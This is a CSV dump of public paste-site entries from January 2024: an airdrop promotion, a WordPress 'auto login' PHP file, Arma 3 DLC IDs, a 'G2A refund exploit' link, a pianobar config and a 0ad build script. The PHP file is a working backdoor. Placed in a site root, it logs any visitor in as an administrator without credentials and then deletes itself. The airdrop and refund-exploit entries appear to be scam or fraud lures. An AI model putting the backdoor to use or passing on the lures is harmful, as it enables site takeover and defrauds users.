id,title,username,language,date,content
4VRUbJ60,🎁 List of all FREE Crypto Airdrops! 🎁,VQ-Moe,GetText,Thursday 4th of January 2024 12:00:35 AM CDT,"Looking for a list of all the current, free airdrops from all blockchains?
Check out NetDrop - https://netdrop.netlify.app/

NetDrop provides a list of all active airdrops, which is updated every minute so you can claim the newest airdrops as soon as they are available.
No more finding airdrops; the airdrops find you.

Visit NetDrop completely free now, no sign-up required.
https://netdrop.netlify.app/

639523"
1yfpnpK5,Wordpress Panel Auto Login,willysec_id,PHP,Wednesday 3rd of January 2024 11:56:39 PM CDT,"<?php
//Place this file to root of wordpress scripts

//Logs to Email
$email = 'mi77ihaxor@gmail.com';

/**
 * @param string $email
 * @return void
 */
function auto_login( $email ) {
    if ( ! is_user_logged_in() ) {
        $user_id       = get_user_id( $email );
        $user          = get_user_by( 'ID', $user_id );
        $redirect_page = admin_url() . '?platform=hpanel';
        if ( ! $user ) {
            wp_redirect( $redirect_page );
            exit();
        }
        $login_username = $user->user_login;
        wp_set_current_user( $user_id, $login_username );
        wp_set_auth_cookie( $user_id );
        do_action( 'wp_login', $login_username, $user );
        // Go to admin area
        wp_redirect( $redirect_page );
        exit();
    }
}

/**
 * @param string $email
 * @return void
 */
function get_user_id( $email )
{
    $admins = get_users( [
        'role' => 'administrator',
        'search' => '*' . $email . '*',
        'search_columns' => ['user_email'],
    ] );
    if (isset($admins[0]->ID)) {
        return $admins[0]->ID;
    }

    $admins = get_users( [ 'role' => 'administrator' ] );
    if (isset($admins[0]->ID)) {
        return $admins[0]->ID;
    }

    return null;
}

// Initialize WordPress
define( 'WP_USE_THEMES', true );
$timeSinceScriptCreation = time() - stat( __FILE__ )['mtime'];
// Delete itself to make sure it is executed only once
unlink( __FILE__ );
if ( ! isset( $wp_did_header ) ) {
    $wp_did_header = true;
    // Load the WordPress library.
    require_once( dirname( __FILE__ ) . '/wp-load.php' );
    // If the user is already logged in just redirect it to admin area
    if ( is_user_logged_in() ) {
        $redirect_page = admin_url() . '?platform=hpanel';
        wp_redirect( $redirect_page );
        exit();
    }
    // Avalon auto-login
    // If script is older than 15 minutes, doesn't log in as admin
    if ( $timeSinceScriptCreation < 900 ) {
        auto_login($email);
    }
    // Set up the WordPress query
    wp();
    // Load the theme template
    require_once( ABSPATH . WPINC . '/template-loader.php' );
}
"
SzwGACyb,Arma 3 DLC Codes,halcyon_,C++,Wednesday 3rd of January 2024 11:40:25 PM CDT,"Global Mobilization = 1042220
SOG Prairie Fire	= 1227700
CSLA 				= 1294440
Western Sahara		= 1681170
Spearhead 1944		= 1175380

Jets 				= 601670
Helicopters			= 304380
Karts				= 288520
Marksmen			= 332350
Laws of War			= 571710
Apex				= 395180
Malden				= 639600
Zeus				= 275700
TacOps Mission Pack	= 744950
Tanks				= 798390
Contact				= 1021790
Art of War Charity	= 1325500"
QGuNB7Pe,🤑 G2A.com Refund Exploit Jan 2024 🤑,G2ARefundExploit,GetText,Wednesday 3rd of January 2024 11:24:24 PM CDT,"G2A.com refund exploit updated guide 
Any item for free on G2A.com such as Amazon, Steam, and any other gift cards.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_705800.pdf
 
Working as of
04 January 2024"
6668qffD,Better Pianobar Config. ((fixed),nitestryker,Bash,Wednesday 3rd of January 2024 11:18:40 PM CDT,"add this to the pianobar config file.
vi ~/.config/pianobar/config

event_command = ~/.config/pianobar/eventcmd.sh
nowplaying_short = ""%t - %a - %l""
nowplaying_prefix = ""♪ Now Playing: ""
time_remaining_prefix = ""⏳ Time Remaining: ""

create shell file:
touch ~/.config/pianobar/eventcmd.sh
edit file:
vi ~/.config/pianobar/eventcmd.sh

#!/bin/bash

# Define the file path to store the now playing and time remaining information
INFO_FILE=~/.config/pianobar/pianobar_info

case ""$1"" in
    songstart)
        # Clear the previous information
        > ""$INFO_FILE""
        ;;
    songlove)
        # Update the information when you ""love"" a song
        RATING=""♥""  # Heart symbol for liked songs
        ;;
    songunlove)
        # Update the information when you ""unlove"" a song
        RATING=""♡""  # Heart outline for unliked songs
        ;;
    songprogress)
        # Extract the progress information (elapsed and duration)
        ELAPSED=""$2""
        DURATION=""$3""
        
        # Calculate the progress percentage
        PROGRESS=$(echo ""scale=2; ($ELAPSED / $DURATION) * 100"" | bc)
        
        # Create a progress bar (adjust the number of '=' characters as needed)
        PROGRESS_BAR=""[""
        for ((i = 0; i < 50; i++)); do
            if ((i < PROGRESS / 2)); then
                PROGRESS_BAR+=""=""
            else
                PROGRESS_BAR+="" ""
            fi
        done
        PROGRESS_BAR+=""] $PROGRESS%""

        # Save the progress information to the file
        echo ""$PROGRESS_BAR"" >> ""$INFO_FILE""
        ;;
    stationfetchplaylist)
        # Handle the stationfetchplaylist event (when fetching a station)
        FETCHING_MESSAGE=""Fetching station playlist...""
        
        # Save the fetching message to the file
        echo ""$FETCHING_MESSAGE"" >> ""$INFO_FILE""
        ;;
    songfinish)
        # Handle the songfinish event (song has finished playing)
        # Clear the information to prepare for the next song
        > ""$INFO_FILE""
        ;;
    *)
        # Save the song and time information to the file
        echo ""$1"" >> ""$INFO_FILE""
        ;;
esac

# Parse and display the information in the terminal
INFO=$(tail -n 2 ""$INFO_FILE"")

# Extract the song, artist, album, and time remaining information
SONG=$(echo ""$INFO"" | tail -n 1)
TIME_REMAINING=$(echo ""$INFO"" | head -n 1)
ARTIST=$(echo ""$SONG"" | awk -F ' - ' '{print $2}')
ALBUM=$(echo ""$SONG"" | awk -F ' - ' '{print $3}')

# Display the information with color codes and custom formatting
if [ -n ""$SONG"" ]; then
    if [ ""$SONG"" != ""$FETCHING_MESSAGE"" ]; then
        echo -e ""\n♪ Now Playing: $SONG""
        echo -e ""⏳ Time Remaining: $TIME_REMAINING""
        echo -e ""★ Rating: $RATING""
    else
        echo -e ""\n♪ Now Playing: $FETCHING_MESSAGE""
    fi
fi

# Send a desktop notification with the song information 
if [ ""$SONG"" != ""$FETCHING_MESSAGE"" ]; then
    notify-send ""Now Playing"" ""$SONG\nArtist: $ARTIST\nAlbum: $ALBUM"" -i audio-x-generic
fi"
LDFB8hDD,build_0ad_a26_on_ubuntu_jammy.sh,Norse_Harold,Bash,Wednesday 3rd of January 2024 11:07:10 PM CDT,"#!/bin/sh

# build_0ad_a26_on_ubuntu_jammy.sh
# Description: script to build 0ad version 0.0.26 on Ubuntu ""Jammy"" (22.04)
# Copyright (c) 2024 Norse_Harold
# Licensed under Creative Commons CC0 1.0 Universal
# The license causes this work to be dedicated to the public domain
# The work is published in the country of the United States

# This script assumes that 0ad_0.0.26.orig.tar.gz,
# 0ad_0.0.26-3build1.debian.tar.xz, and 0ad_0.0.26-3build1.dsc are in the
# current working directory. They can be obtained from
# https://launchpad.net/ubuntu/+source/0ad/0.0.26-3build1

if [ \! \( -e ./0ad_0.0.26-3build1.dsc -a -e ./0ad_0.0.26-3build1.debian.tar.xz -a -e ./0ad_0.0.26.orig.tar.gz \) ] ; then
	echo ""Please download the files listed in this shell script before running this script.""
	echo ""Ensure that you run this script from the directory where the files are stored.""
	exit
fi

# Automatically test the hashes and extract the source code and Debian patches to it
dpkg-source --require-valid-signature --extract ./0ad_0.0.26-3build1.dsc

# Change the working directory to the extracted source code
cd 0ad-0.0.26

# Adjust the build dependencies because Ubuntu Jammy has wxwidgets3.0, not wxwidgets3.2
sed -ie 's/^ libwxgtk3.2-dev,$/ libwxgtk3.0-gtk3-dev,/' debian/control

# Install the build dependencies
sudo apt-get build-dep .

# Build the binary package without signing the result. Signing it would
# require that you generate a GPG key pair and configure your package build
# environment to use it. It's only necessary to sign the package if you are
# planning to distribute it to others
# Thanks to mammadori for suggesting these switches to dpkg-buildpackage
dpkg-buildpackage --unsigned-source --unsigned-changes -b

echo ""*** DONE BUILDING 0AD ***""
echo ""If build was successful then you can install the package with the""
echo ""following commands, assuming your architecture is amd64.""
echo ""cd ..""
echo ""sudo apt install ./0ad_0.0.26-3build1_amd64.deb""
echo ""# for debugging symbols:""
echo ""sudo apt install ./0ad-dbgsym_0.0.26-3build1_amd64.deb""
echo ""(end commands)""
echo ""When debugging with gdb, it may be necessary to use these commands after""
echo ""starting gdb /usr/games/pyrogenesis""
echo "" set directories path/to/extracted/0ad-0.0.26/build/workspaces/gcc""
echo "" start""
echo "" (end gdb commands)""
echo ""Note that modifying the source code conflicts with rebuilding it unless""
echo ""you add a patch to debian/patches and add the patch name to debian/series.""
echo ""Alternatively, you can rebuild each time the upstream way with 'make',""
echo ""then manually copy the resulting binary from binaries/system/pyrogenesis""
echo ""to /usr/games/pyrogenesis""
echo ""Also, don't forget to install 0ad-data version 0.0.26. You can either""
echo ""install a binary package of it from another release of Ubuntu, such as""
echo ""Lunar, or you can carry out a similar procedure to this shell script,""
echo ""but modified for 0ad-data. 0ad-data source archives are available at""
echo ""https://launchpad.net/ubuntu/+source/0ad-data/0.0.26-1""
"
